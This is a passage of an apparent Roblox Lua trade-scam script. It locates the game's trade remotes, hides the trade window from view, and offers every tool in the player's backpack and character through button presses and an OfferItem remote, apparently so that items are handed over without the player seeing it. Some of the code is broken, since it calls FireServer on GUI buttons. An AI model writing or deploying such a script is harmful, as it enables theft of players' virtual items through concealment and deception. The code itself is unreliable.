if not Trade then print("Trade folder not found"); return end

local SendReq = Trade:FindFirstChild("SendRequest")
local AcceptReq = Trade:FindFirstChild("AcceptRequest")
local StartTr = Trade:FindFirstChild("StartTrade")
local AcceptTr = Trade:FindFirstChild("AcceptTrade")
local CompleteTr = Trade:FindFirstChild("CompleteTrade")
local OfferItem = Trade:FindFirstChild("OfferItem")

if not SendReq or not AcceptReq then print("Missing critical remotes"); return end

-- Function to hide ONLY the trade window frame (not entire GUI)
local function hideTradeWindow()
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then return end
    -- Find any frame that is likely the trade window
    local tradeFrame = nil
    local function search(parent)
        for _, child in pairs(parent:GetChildren()) do
            if child:IsA("Frame") and (child.Name:lower():find("trade") or child.Name:lower():find("request")) then
                -- Make sure it's a large frame (likely the main trade window)
                if child.AbsoluteSize.X > 100 and child.AbsoluteSize.Y > 100 then
                    tradeFrame = child
                    return
                end
            end
            search(child)
        end
    end
    search(gui)
    if tradeFrame then
        tradeFrame.Visible = false
        print("Trade window hidden")
    else
        print("No trade window found to hide")
    end
end

-- Function to add items via GUI clicks (more precise)
local function addItemsViaGUI()
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then return 0 end
    -- Find the trade window frame
    local tradeFrame = nil
    local function search(parent)
        for _, child in pairs(parent:GetChildren()) do
            if child:IsA("Frame") and (child.Name:lower():find("trade") or child.Name:lower():find("request")) then
                if child.AbsoluteSize.X > 100 and child.AbsoluteSize.Y > 100 then
                    tradeFrame = child
                    return
                end
            end
            search(child)
        end
    end
    search(gui)
    if not tradeFrame then
        print("No trade frame found for adding items")
        return 0
    end

    -- Look for "Add All" or "Select All" button first
    local addAllBtn = nil
    for _, btn in pairs(tradeFrame:GetDescendants()) do
        if btn:IsA("TextButton") then
            local name = btn.Name:lower()
            if name:find("add all") or name:find("select all") or name:find("offer all") then
                addAllBtn = btn
                break
            end
        end
    end
    if addAllBtn then
        pcall(function() addAllBtn:FireServer() end)
        print("Clicked Add All button")
        return 1 -- assume it added all
    end

    -- Otherwise, click each individual "Add" button
    local count = 0
    for _, btn in pairs(tradeFrame:GetDescendants()) do
        if btn:IsA("TextButton") and (btn.Name:lower():find("add") or btn.Name:lower():find("select")) then
            pcall(function() btn:FireServer() end)
            count = count + 1
            wait(0.05)
        end
    end
    print("Clicked " .. count .. " individual add buttons")
    return count
end

-- Function to offer items via remote (with better data extraction)
local function offerAllViaRemote()
    if not OfferItem then return 0 end
    local offered = 0
    local tools = {}
    -- Get all tools from backpack and character
    for _, t in pairs(player.Backpack:GetChildren()) do
        if t:IsA("Tool") then table.insert(tools, t) end
    end
    for _, t in pairs(char:GetChildren()) do
        if t:IsA("Tool") then table.insert(tools, t) end
    end
    print("Found " .. #tools .. " tools to offer")
    for _, tool in ipairs(tools) do
        -- Try to get item data: maybe tool has attribute "ItemId" or "ID"
        local itemData = nil
        local attributes = tool:GetAttributes()
        if attributes and attributes.ItemId then
            itemData = attributes.ItemId
        elseif attributes and attributes.ID then
            itemData = attributes.ID
        else
            -- Use the tool itself
            itemData = tool
        end
        -- Fire remote with item data
        local ok, err = pcall(function() OfferItem:FireServer(itemData) end)
        if ok then
            offered = offered + 1
            print("Offered: " .. tool.Name)
        else
            -- Try with tool name as string
            ok, err = pcall(function() OfferItem:FireServer(tool.Name) end)
            if ok then
                offered = offered + 1
                print("Offered by name: " .. tool.Name)
            else
                print("Failed to offer " .. tool.Name .. ": " .. tostring(err))
            end
        end
        wait(0.1)
    end
    return offered
end

